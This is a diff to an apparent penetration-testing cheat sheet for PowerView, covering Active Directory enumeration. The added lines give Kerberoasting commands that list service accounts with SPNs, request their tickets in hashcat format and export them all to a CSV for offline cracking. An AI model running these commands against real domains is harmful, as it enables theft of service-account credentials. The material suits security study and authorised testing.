@@ -12,8 +12,6 @@ PowerView is a powerful suite of PowerShell tools for Active Directory enumerati
 Terminal>. .\PowerView.ps1
 ```
 
-`
-
 
 | **Command**                         | **Description**                                                                            |
 | ----------------------------------- | ------------------------------------------------------------------------------------------ |
@@ -62,7 +60,12 @@ Get-DomainTrustMapping # Enumerate domain trusts
 
 Test-AdminAccess -ComputerName <computername>
 
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName # Get Kerberoastable users (Service Accts with SPN)
+1. Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName # Get Kerberoastable users (Service Accts with SPN)
+
+2. Get-DomainUser -Identity <user> | Get-DomainSPNTicket       -Format hashcat # After finding a kerberoastable user, request their ticket in hashcat format
+
+3. Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+# Request all users and export tickets to a file in hashcat format
 
 $sid = Convert-NameToSid <user> # Get SID from username
 Get-DomainObjectACL -Identity <identity of interest or wildcard> | ? {$_.SecurityIdentifier -eq <sid> } # Get ACL of user via sid
